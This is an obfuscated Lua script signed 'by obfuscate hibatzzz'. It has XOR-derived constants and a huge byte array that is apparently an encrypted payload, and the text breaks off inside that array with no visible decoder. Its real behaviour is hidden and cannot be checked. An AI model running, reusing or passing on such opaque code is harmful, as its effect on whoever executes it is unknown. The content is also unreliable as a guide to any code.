-- by obfuscate hibatzzz
local _0x651F4546922F={95,17,179,209,139,127,135,81,46,25,215,171,217,191,110,80,60,252,51,14,40};
local _0x1804C07D14A1,_0x65C4512347C7=141,173;
local _0x9D1A34489BD8,_0xBC966CD8EE00=162,169;
local _0xBCBE3A98774B,_0x66B2AACC25FE=191,174;
local _0xF00D7965D963=bit32.bxor(_0x1804C07D14A1,_0x65C4512347C7);
local _0x58906A343F21=bit32.bxor(_0x9D1A34489BD8,_0xBC966CD8EE00);
local _0x86EC4792DC88=bit32.bxor(_0xBCBE3A98774B,_0x66B2AACC25FE);
local _0xC7D0D063CBA4,_0x1362459386CB=73424,353;
local _0x5A4B8C883EBD,_0xC423377EF3CE=50802,158;
local _0x7DA1A19484A5=bit32.bxor(_0xC7D0D063CBA4,_0x1362459386CB);
local _0xE635BE6E0BB2=bit32.bxor(_0x5A4B8C883EBD,_0xC423377EF3CE);
local _0x31D539E31DA9,_0xDD5EDF51A6B1=139,185;
local _0x46C4B13A54A0,_0x823CB24CB173=176,153;
local _0x49DEDA4648E8,_0xA242141877A3=152,151;
local _0x69F1BA709A7B=bit32.bxor(_0x31D539E31DA9,_0xDD5EDF51A6B1);
local _0xB91954DD396D=bit32.bxor(_0x46C4B13A54A0,_0x823CB24CB173);
local _0xC579FBBEC693=bit32.bxor(_0x49DEDA4648E8,_0xA242141877A3);
local _0x3233AB90B3E8,_0x97833D76A2B0=48318,215;
local _0x84C6E3629239,_0xD514FC96083E=39355,200;
local _0xABC63D11A0C8=bit32.bxor(_0x3233AB90B3E8,_0x97833D76A2B0);
local _0x73EC0794A763=bit32.bxor(_0x84C6E3629239,_0xD514FC96083E);
local _0x25958576531A={149,170,227,186,37,124,106,81,44,115,65,22,66,90,30,147,220,142,5,94,108,63,210,160,107,126,97,120,50,172,203,35,75,99,90,212,154,149,13,113,193,42,192,40,253,23,100,111,49,247,181,177,131,236,112,208,194,216,144,17,76,42,23,195,250,252,162,147,110,226,242,237,164,77,0,14,109,194,218,28,78,85,1,79,225,160,178,161,201,123,170,228,239,64,65,64,68,65,92,68,15,17,91,76,223,170,173,170,123,114,52,59,46,24,68,67,94,125,7,185,150,214,78,90,108,93,151,244,115,118,96,68,39,230,154,119,78,108,72,205,208,153,52,127,199,55,204,112,172,97,63,123,107,225,175,246,138,236,111,192,193,206,101,14,20,123,7,158,168,235,162,16,40,177,236,234,183,8,71,28,8,202,31,6,89,86,80,10,249,229,237,226,188,53,251,254,248,73,90,16,72,30,135,6,43,84,50,28,226,186,227,238,33,98,47,113,124,110,98,6,89,121,154,129,154,203,87,67,58,39,158,131,50,125,112,127,58,168,154,119,66,116,70,194,192,223,74,122,210,42,212,40,250,106,99,126,43,188,189,161,148,193,36,196,203,156,0,95,5,115,22,155,168,160,166,78,117,234,177,182,183,29,81,76,251,141,31,86,89,27,28,95,166,182,191,41,234,32,226,191,241,84,70,23,40,24,131,27,69,73,93,31,138,186,241,101,32,100,44,32,44,51,64,77,64,45,159,134,151,230,19,6,58,96,132,96,115,53,104,99,34,174,219,119,35,63,199,197,150,158,92,121,183,109,153,184,189,114,47,46,33,190,174,174,204,178,191,218,209,150,30,95,80,1,15,131,240,247,236,28,40,226,166,232,161,16,91,90,231,208,7,16,31,31,93,14,248,54,224,20,186,19,225,162,177,73,29,90,127,90,148,26,77,78,18,73,142,143,241,49,106,99,96,103,43,115,65,77,104,42,157,193,158,136,73,27,108,150,210,100,122,54,31,104,62,182,203,62,51,52,192,144,192,151,77,49,134,118,208,189,164,48,1,46,127,186,189,234,235,246,243,135,161,194,18,29,24,32,11,9,188,175,236,11,50,243,240,245,42,107,81,29,247,128,69,78,79,30,1,134,241,30,247,75,186,105,190,250,241,7,62,17,47,6,245,64,2,88,18,128,223,202,170,61,50,108,96,51,124,50,106,80,119,48,136,147,128,203,71,91,49,141,213,113,100,127,6,39,35,252,246,62,30,111,193,152,142,129,74,61,138,140,212,161,248,49,121,104,122,188,163,184,167,168,239,139,195,217,74,14,17,19,23,76,252,186,253,85,117,255,242,187,53,71,65,14,182,218,11,76,89,20,6,134,231,87,186,93,185,48,226,225,114,65,35,21,49,91,148,6,89,55,1,208,201,152,240,59,96,127,56,124,126,47,113,27,49,48,136,193,134,149,78,129,97,196,222,117,58,96,55,43,250,167,251,126,123,60,197,198,130,153,16,25,144,223,203,186,199,54,53,104,106,251,161,184,247,182,181,200,143,223,10,3,17,108,87,34,181,183,184,16,37,161,226,238,101,126,65,92,182,214,7,26,59,72,5,215,254,22,237,93,234,47,245,245,105,69,59,12,52,65,128,70,94,16,93,129,157,148,244,102,24,37,106,32,61,41,49,12,53,117,158,220,157,107,31,156,47,205,142,104,127,33,215,50,161,252,172,53,124,63,201,177,140,19,92,11,210,143,206,229,236,58,124,114,182,167,135,177,224,183,169,200,213,93,30,30,0,6,30,75,225,176,162,72,169,229,238,182,61,74,15,28,247,211,90,93,16,16,74,158,233,87,240,81,122,46,173,228,126,80,38,77,47,27,220,91,2,90,0,220,223,253,243,120,46,45,38,97,123,47,97,77,126,53,145,231,152,116,83,202,119,203,158,96,115,44,197,115,191,247,171,127,59,117,218,161,236,29,18,120,220,205,209,169,186,45,8,122,250,165,226,246,160,166,243,144,219,0,6,13,12,71,13,93,168,247,67,15,255,163,253,182,95,26,17,65,254,88,66,11,75,7,11,146,233,24,67,20,108,33,244,237,49,64,39,16,49,234,129,32,67,72,70,138,212,152,177,103,8,63,40,33,88,96,107,1,102,180,155,141,157,31,9,129,45,205,213,96,44,96,149,39,179,173,171,37,96,235,223,254,192,6,92,8,210,140,202,251,84,48,69,124,244,190,187,172,160,240,244,172,207,64,70,66,64,26,12,31,73,193,10,9,164,217,238,224,111,92,13,54,190,28,1,12,75,73,10,202,209,5,94,81,58,53,238,175,109,73,59,58,127,219,220,75,67,43,26,219,147,152,101,99,103,33,105,38,102,50,118,98,111,175,218,209,142,114,85,129,108,207,21,96,99,58,215,50,162,183,185,119,101,254,141,254,203,57,74,123,210,130,56,251,81,117,29,104,182,178,165,168,166,252,169,237,134,62,80,108,90,5,74,46,81,176,74,15,232,225,140,249,127,93,65,44,150,41,66,28,79,69,64,142,149,67,75,25,32,43,245,164,114,105,55,62,45,137,130,66,77,16,95,198,194,145,101,54,49,97,107,59,126,125,58,96,111,243,144,145,154,101,37,203,220,200,95,60,99,58,215,46,171,234,237,115,32,254,223,212,208,1,120,11,144,153,82,235,85,98,73,126,252,188,180,187,235,242,241,189,145,92,7,13,24,65,65,93,77,170,33,94,164,238,224,96,127,91,81,45,135,91,83,22,85,19,199,146,149,20,82,68,103,42,234,123,54,109,117,96,127,209,156,17,94,91,145,129,196,209,36,103,96,127,62,113,103,120,107,123,63,233,193,144,135,108,154,211,219,209,12,60,99,45,197,50,186,160,174,117,97,188,145,239,218,10,6,10,143,130,10,230,3,110,29,104,229,235,255,187,179,189,241,248,213,88,30,67,71,81,51,18,59,225,86,88,161,161,136,36,46,43,71,50,247,81,7,70,126,7,147,138,143,89,10,72,46,57,166,18,55,33,47,125,47,192,190,22,58,64,146,208,233,152,43,18,48,52,32,184,98,120,25,115,114,250,202,219,230,107,216,199,140,192,83,123,55,44,222,168,241,182,183,8,122,237,139,187,145,27,79,17,154,149,82,160,69,118,11,171,233,178,226,168,241,242,253,177,215,77,86,20,78,81,74,84,75,177,74,223,170,243,224,122,51,48,16,62,247,64,74,86,126,23,128,135,139,79,69,69,118,153,241,54,108,83,36,50,105,128,100,15,50,10,150,146,148,137,122,120,112,201,75,163,103,109,120,115,44,238,152,205,251,59,140,197,190,144,20,36,111,22,197,216,160,207,168,113,38,183,134,239,27,0,14,25,204,222,86,176,5,0,21,187,248,177,161,168,241,176,229,177,44,67,14,24,64,75,16,93,75,225,94,183,176,241,188,32,47,122,21,54,110,72,75,64,89,20,199,143,144,95,38,47,124,223,247,127,24,121,126,58,173,152,56,22,125,28,140,221,156,145,49,192,58,193,87,180,42,117,42,60,103,250,236,193,235,117,132,145,150,217,14,90,99,30,197,189,179,182,183,40,102,188,245,227,83,27,30,14,194,143,94,169,69,80,89,233,252,162,164,185,179,226,181,177,99,22,81,67,4,19,91,83,74,65,86,222,224,201,160,106,113,113,122,102,63,81,1,89,112,20,128,146,144,6,94,48,97,135,240,100,126,54,36,103,182,218,62,14,110,81,199,192,213,92,116,210,118,141,106,180,19,120,32,59,170,179,180,143,169,40,220,218,150,80,17,10,111,127,219,186,189,226,252,105,231,172,232,254,8,86,30,91,204,197,10,85,5,118,89,240,226,236,173,189,45,235,245,244,69,26,10,20,8,7,65,89,84,83,6,207,186,243,253,124,61,122,36,62,125,16,87,89,36,7,131,156,144,20,71,107,102,143,226,96,42,45,47,106,190,232,59,49,111,62,221,139,159,13,38,197,109,216,57,246,106,124,100,107,253,179,176,202,178,124,198,223,206,0,19,17,42,22,133,234,241,189,4,103,186,247,249,164,8,19,24,11,211,95,10,76,14,93,95,233,224,176,79,186,57,235,249,233,0,84,2,13,92,198,16,69,10,55,77,211,251,183,182,96,63,52,124,109,2,72,77,78,110,132,215,151,143,94,2,35,97,151,234,49,33,105,52,32,190,154,8,0,125,138,199,142,158,16,123,155,49,138,75,236,32,116,46,127,163,171,247,224,255,112,196,155,157,7,73,24,99,87,215,189,183,231,94,105,160,240,224,162,17,92,31,247,144,93,10,1,30,18,126,189,224,237,20,252,117,251,185,186,91,71,64,49,70,157,0,3,84,83,6,207,161,235,108,62,45,119,61,45,125,88,10,111,115,193,135,142,140,87,64,113,97,155,42,96,54,33,39,50,247,128,123,80,107,217,198,148,141,92,67,148,34,154,187,231,43,101,39,123,178,175,184,219,167,243,223,129,135,115,29,81,123,30,76,234,183,180,78,46,131,172,187,196,90,21,31,164,213,91,86,87,69,92,5,240,69,172,8,160,47,242,228,188,88,39,20,42,92,154,72,69,80,95,6,207,140,161,32,59,63,47,124,62,113,7,105,119,48,136,132,159,153,75,16,55,207,128,125,43,126,104,39,34,252,128,47,96,110,193,152,214,207,10,59,219,197,216,160,188,98,101,100,115,251,179,160,160,252,239,218,215,222,93,126,13,42,8,85,239,193,132,5,43,243,173,234,114,90,66,86,249,209,83,28,80,5,64,202,225,64,171,60,190,120,254,225,112,88,120,75,45,1,208,16,94,16,11,158,207,178,172,44,106,121,96,51,50,109,49,23,126,46,136,131,152,153,33,156,47,144,155,60,33,124,33,53,32,252,160,100,126,107,128,205,224,149,8,103,147,223,192,205,163,98,126,121,100,190,226,249,170,172,176,135,135,135,1,14,10,64,14,79,237,175,182,125,37,229,182,249,49,71,70,86,228,128,68,23,56,14,11,215,160,16,182,83,168,33,251,191,60,65,63,102,61,8,209,10,15,98,50,158,143,152,161,116,37,45,113,42,48,37,108,81,126,50,202,138,207,48,75,156,98,148,151,120,96,44,110,53,171,190,220,121,96,111,197,198,209,154,76,16,222,169,145,231,252,116,123,60,250,171,226,174,191,230,180,218,140,135,1,74,17,10,87,84,250,197,247,28,77,243,253,233,51,90,3,65,184,206,64,64,85,7,91,150,231,19,229,31,176,112,236,229,55,73,33,14,54,27,134,80,91,64,31,132,223,215,183,116,119,35,75,63,123,116,116,12,42,60,128,135,204,111,31,192,102,217,196,120,63,119,164,98,165,173,183,102,60,109,201,221,154,2,12,17,177,172,128,184,251,3,29,114,252,190,255,184,231,252,239,192,138,27,26,13,76,90,87,77,225,226,225,28,254,235,238,240,127,8,81,94,181,28,28,64,78,18,0,151,160,89,171,31,38,112,247,175,106,11,55,2,61,74,213,16,31,90,17,146,250,150,241,59,118,52,58,58,98,41,120,75,111,52,129,215,214,117,5,195,58,202,213,58,42,102,215,47,253,173,183,123,114,125,218,241,155,70,13,17,210,193,216,169,164,113,20,123,182,240,239,182,244,190,241,176,155,27,80,39,20,19,93,93,177,241,82,85,176,161,182,173,49,6,85,123,185,91,69,71,28,25,11,146,177,94,82,79,79,53,235,228,110,64,126,2,37,154,131,14,90,72,78,208,209,139,101,102,118,37,58,122,101,116,44,80,104,189,129,131,159,106,84,211,35,152,189,104,33,44,152,52,253,178,237,56,124,242,134,183,147,7,18,0,138,193,128,184,30,112,14,120,166,253,173,168,241,251,237,177,210,22,80,89,1,19,95,18,16,236,12,15,143,146,250,239,61,90,65,62,181,81,75,22,13,83,18,139,142,5,92,68,46,40,163,163,126,94,117,38,52,155,133,66,11,91,7,146,217,202,122,59,34,112,38,63,99,111,111,22,55,189,155,145,153,116,71,211,106,150,79,96,99,120,153,54,179,247,251,116,59,242,139,191,139,10,9,16,196,193,94,190,94,110,79,42,244,243,191,184,179,225,238,246,129,84,26,1,22,71,66,83,59,183,86,13,232,225,248,235,43,90,74,44,247,72,65,88,21,20,129,204,144,3,28,74,34,47,243,140,112,104,57,35,111,163,192,84,77,81,17,131,196,141,101,120,34,33,122,119,60,101,59,39,114,222,199,226,150,124,21,192,129,207,84,112,5,60,152,43,165,162,251,111,124,178,209,164,148,92,87,12,144,196,10,186,7,117,69,9,250,253,210,234,252,189,175,186,233,84,27,24,25,26,74,93,0,176,12,9,232,161,250,87,37,56,20,62,239,91,22,88,89,78,209,220,205,67,82,31,55,109,238,97,42,42,101,106,44,218,221,13,4,26,156,155,223,152,124,61,49,100,106,172,122,124,116,115,114,164,136,205,142,40,192,135,217,150,81,13,107,13,215,52,191,167,181,116,103,254,216,162,199,65,86,25,206,218,94,167,113,98,29,42,182,172,180,161,225,190,243,246,211,84,22,30,80,71,10,93,12,236,80,21,186,162,250,112,53,106,81,44,163,98,93,11,47,21,133,220,153,87,52,79,34,159,250,103,118,107,36,112,111,137,214,13,110,26,182,221,232,148,127,59,34,100,40,161,106,97,116,99,126,174,132,145,182,112,171,156,220,209,19,97,109,103,149,189,171,236,240,103,123,254,172,161,90,0,22,11,160,222,74,187,94,98,17,177,248,162,163,168,224,170,253,248,129,69,26,24,71,92,20,79,79,163,28,143,141,250,161,119,105,108,96,48,228,90,23,28,41,69,155,215,205,70,82,51,108,133,235,100,45,121,55,102,40,203,123,90,110,16,150,208,196,137,105,32,110,154,97,167,97,35,104,106,103,174,224,148,241,110,129,129,221,155,127,123,109,30,149,234,189,207,171,103,114,254,136,251,77,31,22,10,189,221,86,188,3,74,12,165,250,171,173,252,171,166,234,235,65,77,17,4,71,0,82,119,17,17,72,207,254,227,238,96,61,119,23,38,111,94,16,26,104,72,129,140,153,68,0,58,97,153,236,33,118,43,126,32,247,137,97,76,125,68,212,221,195,218,101,219,96,200,59,164,123,97,112,115,186,172,241,131,190,114,218,203,140,204,14,13,49,92,197,187,160,167,185,19,126,230,232,190,70,81,36,65,177,159,94,75,69,115,84,224,181,224,163,191,241,166,251,235,73,93,18,13,8,81,49,81,64,93,94,140,167,158,189,106,40,48,33,38,50,28,6,45,48,30,159,136,219,31,0,97,46,242,240,115,59,59,52,58,252,129,119,12,63,72,218,146,159,74,112,220,46,153,40,253,53,119,116,49,224,175,236,215,206,36,138,157,135,80,14,74,55,118,194,202,160,174,181,113,171,237,171,245,25,119,28,25,150,11,82,80,115,5,73,172,167,179,173,234,107,170,254,177,11,22,19,13,90,5,6,65,77,0,72,254,232,201,172,50,111,122,85,55,107,68,91,26,90,20,159,154,219,84,82,98,54,207,251,115,111,43,39,77,182,193,119,66,125,64,157,203,133,30,101,173,109,193,122,161,32,124,122,49,164,151,182,209,251,24,220,129,199,1,79,15,99,13,186,252,179,166,16,111,167,230,245,175,1,117,7,0,208,17,23,80,27,98,15,250,183,171,68,252,123,254,251,239,2,84,2,30,71,221,16,67,73,91,17,139,169,227,102,35,33,40,33,50,125,70,79,78,40,202,129,130,144,80,69,52,46,151,240,50,125,109,110,62,190,246,50,81,25,209,199,159,158,15,112,195,46,198,36,163,98,122,104,101,186,189,168,197,251,51,154,195,139,74,10,1,115,30,143,231,170,246,122,119,189,240,245,245,24,81,2,190,209,95,76,28,89,18,29,229,65,162,31,234,117,130,175,235,69,84,90,36,80,152,74,88,29,66,94,157,167,170,103,59,59,40,122,119,63,72,75,114,104,155,138,142,145,15,68,35,57,196,97,97,58,117,127,33,190,208,53,59,50,220,135,208,154,30,61,195,34,212,186,253,122,120,100,127,224,160,244,139,178,178,154,202,134,18,79,93,33,123,81,234,247,191,78,40,225,238,238,165,16,103,2,177,210,83,70,23,85,80,19,252,19,237,79,160,92,189,237,234,71,34,81,23,16,198,27,85,26,91,77,137,148,234,101,105,45,34,35,109,101,116,77,102,50,128,185,157,153,82,82,49,202,133,120,18,33,59,54,50,190,135,126,48,104,155,216,138,132,9,127,198,220,128,235,172,114,53,96,101,178,181,182,235,178,180,208,208,150,18,88,24,26,16,93,204,226,189,21,107,188,172,232,127,1,76,25,226,189,17,10,89,79,4,144,171,79,170,93,178,57,224,168,109,93,117,40,127,6,198,67,77,23,91,156,133,152,183,53,102,100,56,103,106,101,120,82,55,100,233,222,194,208,19,197,45,137,159,123,122,33,111,127,112,241,161,111,61,115,171,212,199,131,81,10,210,193,140,165,245,110,127,127,29,251,226,241,171,247,243,156,203,170,18,73,9,1,10,93,189,177,187,16,103,226,161,249,37,67,69,70,228,194,49,6,13,78,6,151,166,21,177,93,238,57,241,185,104,12,59,10,23,25,148,45,21,91,65,156,207,215,162,103,62,60,42,124,38,110,107,90,103,111,237,147,142,51,75,198,65,202,195,42,115,110,119,88,240,241,172,99,96,115,134,205,142,129,76,95,193,196,154,169,161,39,100,100,166,230,173,224,253,178,243,200,209,214,94,24,74,19,12,93,206,198,250,18,167,183,252,245,43,8,96,72,255,202,90,86,80,15,28,215,229,15,237,78,164,41,238,191,84,6,126,2,40,8,156,76,47,68,22,146,157,140,128,39,32,33,33,124,103,115,111,67,56,110,136,146,130,29,71,202,123,156,134,104,54,124,219,52,231,252,183,37,123,101,201,157,140,31,23,75,203,159,214,200,194,98,19,60,248,254,239,180,161,172,232,156,144,70,28,76,24,117,10,83,168,180,187,94,194,251,247,234,61,71,117,29,224,10,95,30,75,85,74,215,233,30,174,85,107,45,171,162,103,14,55,14,61,135,148,13,93,10,18,221,216,192,241,96,46,52,112,32,123,108,106,77,60,36,199,146,142,36,73,218,64,150,222,48,55,8,195,105,179,253,177,37,114,52,220,239,140,11,52,21,193,205,144,250,69,122,88,104,187,160,207,176,165,190,180,232,145,88,1,89,10,80,15,93,161,247,74,4,170,251,168,173,120,8,87,106,182,94,91,87,64,78,10,180,229,89,82,9,103,57,186,162,42,73,55,23,46,234,135,87,15,89,65,146,138,141,122,103,84,100,106,127,123,25,113,17,55,248,152,204,128,61,79,211,53,144,73,104,109,127,196,39,179,178,171,62,101,212,222,165,205,11,127,80,155,217,197,167,88,106,13,60,227,241,163,219,161,254,253,229,195,84,10,85,127,19,23,69,17,247,12,28,251,235,143,241,53,122,26,93,149,70,26,2,1,87,18,151,250,15,67,31,39,33,183,229,109,90,59,127,111,154,204,66,65,72,70,138,129,148,116,108,46,62,33,51,114,101,44,23,114,250,149,202,128,112,9,211,43,155,21,42,49,120,253,39,242,236,177,110,97,184,192,164,140,6,30,13,218,152,79,251,25,54,83,48,244,170,239,164,253,175,245,186,195,26,26,68,17,65,54,26,17,173,76,82,225,250,226,245,105,54,17,106,251,80,67,26,81,78,134,142,205,25,27,85,60,53,226,254,118,112,59,112,91,137,192,85,94,72,199,154,196,214,61,125,103,62,100,59,122,57,106,101,110,189,218,228,214,26,86,195,222,204,95,122,118,119,197,39,179,190,175,51,96,237,193,164,155,19,15,21,144,213,86,161,23,54,11,43,252,234,181,231,170,176,241,248,161,84,80,67,27,2,58,76,26,176,70,15,240,177,187,116,127,108,10,62,229,72,91,94,36,7,131,198,137,25,23,31,39,33,160,89,118,112,99,96,110,156,141,85,2,68,128,219,223,129,59,59,46,45,33,161,63,97,29,98,109,244,128,131,153,62,216,195,221,159,11,104,42,119,176,234,235,167,247,107,103,188,139,254,130,10,76,80,202,193,67,235,23,112,5,58,237,237,186,191,196,161,238,158,195,84,26,66,4,27,29,5,78,240,17,20,254,238,254,106,46,126,15,44,239,72,83,66,50,11,147,138,153,18,82,78,124,132,171,115,111,111,84,96,61,219,192,12,25,91,216,134,131,209,62,44,46,206,102,210,60,125,120,5,126,171,145,144,173,36,221,218,140,145,29,125,44,58,206,164,186,183,169,37,124,236,221,162,0,19,25,95,189,143,87,235,25,45,14,150,181,224,207,205,191,251,245,248,93,70,20,95,30,7,67,84,81,163,71,142,225,187,252,123,46,56,74,108,181,64,81,28,48,78,245,150,129,25,82,43,32,142,186,125,108,121,112,39,101,133,19,16,111,10,212,132,133,178,105,32,52,154,57,253,61,109,118,39,60,255,182,204,237,46,196,156,140,217,95,97,38,95,149,186,165,250,176,103,96,236,241,191,83,118,6,25,194,213,72,251,85,74,15,240,244,177,187,235,225,252,166,238,88,66,26,5,27,71,69,4,77,11,73,142,161,243,254,36,61,56,23,124,115,68,90,24,36,30,147,209,153,75,27,52,108,132,176,127,103,108,55,58,252,158,101,13,115,10,254,155,206,139,49,210,96,216,103,243,42,63,109,115,234,233,171,145,234,53,200,219,206,203,12,24,33,87,193,202,164,246,201,116,48,177,239,229,106,29,86,65,194,216,77,72,25,18,95,188,237,177,186,187,187,161,245,239,89,6,67,30,34,90,29,21,88,93,94,197,232,162,243,96,127,32,51,119,47,44,1,70,88,95,199,210,145,80,66,113,118,213,238,123,126,43,53,126,241,198,54,78,125,88,212,237,158,74,126,222,96,145,91,180,124,125,121,122,224,174,176,193,170,104,216,131,150,6,12,81,113,11,193,252,179,190,181,105,186,237,236,185,34,1,93,92,194,65,82,11,94,30,20,143,172,174,228,231,43,225,228,244,73,92,16,89,24,7,64,84,26,11,10,216,186,172,226,112,98,108,124,44,125,7,1,64,117,20,147,235,149,79,16,97,61,151,235,125,96,110,51,113,172,137,119,88,63,91,216,130,132,30,121,195,122,204,58,184,122,53,96,33,240,252,175,154,230,124,138,208,141,2,19,103,122,30,156,168,252,162,16,40,234,235,247,191,26,71,73,184,209,17,28,75,4,93,79,187,146,241,81,250,48,187,162,244,6,84,80,26,92,157,16,29,12,121,23,147,232,227,61,32,111,49,38,20,31,90,2,71,50,196,209,153,143,38,10,106,103,151,238,58,110,106,99,59,173,232,99,87,109,199,216,229,196,30,103,197,58,212,59,209,72,123,48,96,178,239,221,148,234,169,166,140,216,91,124,24,48,13,149,235,251,187,82,117,255,236,157,254,28,6,28,175,128,64,16,24,4,0,29,250,30,247,59,252,113,189,252,186,73,73,26,43,6,219,94,90,88,70,82,206,150,240,103,39,45,122,61,124,63,13,77,108,126,157,154,128,138,71,75,97,55,158,100,107,110,117,88,59,234,153,8,123,108,218,204,147,141,76,32,193,46,140,203,165,117,34,14,97,190,252,184,145,183,154,138,195,198,18,29,11,44,18,9,176,236,167,80,103,230,177,235,248,105,124,65,229,128,26,28,56,0,30,146,255,89,240,84,235,125,252,164,224,89,100,21,111,110,134,91,5,81,70,71,212,138,240,54,125,127,48,122,62,63,113,5,99,48,198,157,159,142,71,90,108,202,133,102,96,33,31,117,43,176,170,17,48,113,222,199,214,158,13,60,134,130,203,176,162,54,34,14,115,160,181,222,187,178,130,222,141,216,30,88,75,7,22,31,185,171,174,79,110,243,239,245,45,4,81,0,247,203,74,61,27,69,1,146,249,87,176,77,216,57,252,250,114,95,57,23,47,29,156,92,93,49,22,193,147,209,243,103,33,104,106,32,103,51,44,1,107,52,136,199,135,149,21,211,113,155,208,39,32,32,96,47,58,170,240,123,98,60,154,140,139,141,12,21,177,153,204,191,224,98,53,38,96,188,165,241,231,241,243,187,135,220,70,4,76,7,12,93,164,175,236,94,103,255,224,187,111,21,15,0,184,143,26,28,31,7,4,203,249,53,176,75,168,55,240,162,103,27,101,2,51,16,148,29,94,72,71,208,201,141,243,101,96,45,122,39,122,113,118,10,40,90,136,128,193,108,21,146,53,217,196,48,39,102,56,68,189,234,176,49,114,63,201,150,155,11,6,21,193,212,203,169,184,115,126,42,172,240,191,176,189,246,175,219,155,150,30,4,1,31,95,83,186,183,180,125,241,160,226,235,126,4,3,90,231,206,7,22,80,11,28,202,233,87,170,81,72,123,243,229,110,88,34,17,40,119,130,66,85,10,75,132,201,152,177,125,102,79,97,124,16,47,8,17,106,60,220,209,128,112,5,145,42,141,129,23,125,120,215,104,196,178,244,19,122,104,201,199,208,81,88,84,219,197,216,177,246,108,13,42,161,224,203,184,161,178,165,196,138,0,30,20,127,31,7,72,187,171,86,73,241,177,188,187,95,24,3,65,228,81,64,7,1,83,11,220,187,19,162,75,57,41,243,172,42,0,32,2,51,198,134,87,69,95,74,156,207,223,243,120,48,57,57,103,126,108,7,27,111,244,155,148,193,58,8,198,47,217,210,125,0,98,196,39,191,178,225,110,97,113,159,248,140,19,92,74,144,197,216,165,85,72,5,123,231,178,161,234,213,234,245,153,209,76,6,13,87,75,10,93,234,225,94,78,140,229,238,225,37,16,87,54,228,27,17,45,64,69,11,140,248,5,94,76,62,57,226,225,102,11,111,106,66,152,135,0,85,90,71,146,223,218,105,54,43,63,33,59,97,63,118,23,49,174,128,219,199,112,78,129,96,192,19,126,112,54,215,53,179,190,237,99,97,183,217,164,192,0,127,74,192,216,86,235,31,108,29,102,252,165,189,184,187,252,235,186,128,66,6,29,14,5,8,25,86,176,94,15,232,224,182,249,43,43,19,113,181,10,83,87,27,22,30,198,215,30,82,78,46,43,240,191,126,64,36,24,47,163,130,66,14,16,95,158,206,218,58,103,112,110,49,34,59,50,32,103,109,242,136,154,152,108,94,193,220,217,79,100,112,98,215,63,166,221,161,118,98,239,192,248,218,81,13,15,144,143,86,241,5,44,10,123,182,171,226,187,251,250,239,153,195,26,3,95,16,3,94,15,80,178,82,89,171,186,230,32,42,96,87,86,163,16,28,10,1,95,208,209,128,54,82,69,111,107,176,248,126,45,117,50,105,154,214,80,3,89,150,209,131,128,113,116,53,62,78,38,96,99,113,115,118,189,202,202,204,124,6,145,222,157,8,58,99,47,147,68,161,205,170,103,48,238,217,187,130,26,16,11,218,197,80,250,69,45,83,100,189,235,165,234,164,176,235,248,138,13,28,1,65,31,71,73,57,177,76,94,167,228,252,106,47,113,3,46,229,91,1,22,126,7,203,215,248,57,82,59,57,97,234,96,60,33,59,32,115,222,157,26,52,68,155,158,195,148,123,122,34,45,58,166,38,97,60,103,118,189,202,141,134,50,196,198,206,213,5,127,42,8,192,189,163,250,181,107,114,246,192,239,154,90,31,13,194,149,6,177,30,113,29,38,229,221,173,230,241,230,236,182,140,70,71,1,71,5,45,93,76,251,72,72,161,235,182,102,106,118,13,109,225,65,74,92,47,72,132,209,137,89,20,74,58,222,241,33,58,48,126,62,43,135,152,11,125,1,221,198,133,202,43,54,48,201,61,166,126,57,57,115,50,173,154,131,174,111,200,192,129,204,10,126,113,14,194,187,163,252,161,46,38,254,201,254,90,81,22,25,210,149,29,186,67,58,20,254,248,179,181,241,191,251,179,170,69,6,14,30,27,26,10,5,75,171,28,210,255,227,252,50,47,47,65,62,247,1,2,0,36,20,193,141,203,87,90,106,109,151,238,61,63,54,123,38,49,128,47,80,116,0,135,198,196,215,126,199,107,154,38,184,124,109,109,50,49,243,175,204,176,40,192,218,217,213,73,123,106,74,222,186,208,246,251,118,97,183,245,217,65,0,90,21,194,149,12,224,99,26,95,225,187,172,173,191,165,187,225,183,73,64,2,28,1,31,30,93,81,17,77,210,140,166,238,83,127,52,17,40,106,89,32,88,60,30,147,210,219,82,23,59,97,216,226,97,59,121,111,42,176,206,103,11,40,88,212,128,157,136,43,155,43,207,97,189,32,47,29,43,187,169,232,154,173,100,198,219,156,206,10,10,42,95,215,168,186,167,185,112,225,247,237,227,31,71,14,86,206,195,12,10,25,70,17,251,226,237,173,164,252,190,237,237,89,21,16,30,4,81,91,92,77,90,74,157,252,183,171,112,52,48,107,45,111,70,23,26,100,85,154,154,139,83,90,92,38,143,244,101,126,105,52,112,176,145,93,39,105,93,192,219,141,22,38,173,112,128,103,165,114,126,39,115,254,179,182,155,247,111,223,193,194,70,21,24,106,13,148,168,191,174,247,117,188,254,249,190,8,81,29,25,208,70,12,56,88,26,21,189,244,224,190,185,112,251,181,182,73,0,20,75,90,198,70,65,84,28,82,252,230,247,186,112,35,108,63,47,52,91,77,10,45,9,229,205,209,21,28,106,108,129,250,127,33,61,105,58,251,198,119,35,110,93,198,144,148,74,61,222,99,216,106,162,45,57,125,43,178,229,169,148,190,124,218,129,217,91,126,8,113,122,219,189,186,250,68,105,243,254,184,242,31,82,76,249,223,83,10,13,23,27,29,233,189,183,81,240,55,224,228,182,94,66,2,80,4,154,29,90,64,53,77,223,151,234,100,112,97,54,33,44,113,72,67,70,52,129,132,193,136,38,29,54,46,213,42,103,127,108,105,39,220,155,56,78,110,157,150,149,153,23,59,248,103,201,124,180,122,122,104,33,187,170,247,143,175,243,200,145,139,65,19,50,99,92,199,225,247,166,21,107,224,242,249,164,29,17,2,177,208,62,76,11,23,18,81,225,64,174,84,250,119,224,165,233,65,69,64,47,92,245,66,85,88,30,94,136,204,227,108,123,33,113,51,40,125,65,12,102,46,144,130,158,141,81,29,35,184,129,60,96,30,109,117,112,169,137,111,61,110,201,128,203,196,10,10,207,122,128,189,252,1,11,11,89,224,216,171,160,236,178,218,139,223,64,84,22,106,92,34,176,176,166,4,37,243,172,241,187,88,81,6,224,128,7,82,87,0,93,202,150,21,240,26,252,57,227,244,170,64,62,90,117,16,133,74,95,26,1,219,141,202,170,116,123,35,89,126,112,37,116,82,105,46,136,203,134,141,31,74,48,144,158,48,55,33,121,99,116,178,181,53,33,116,218,218,130,148,73,125,134,218,145,230,230,29,18,11,125,178,232,247,191,237,253,154,202,223,30,21,74,29,92,25,164,170,167,11,53,217,236,234,46,26,91,77,135,151,17,27,80,11,28,209,225,67,193,30,161,109,235,245,126,69,63,18,42,27,141,82,21,64,83,208,197,138,240,125,50,121,119,61,126,46,107,84,26,48,136,247,130,219,83,181,49,154,196,96,60,110,96,101,186,190,183,123,114,116,157,145,225,222,30,0,157,212,205,180,167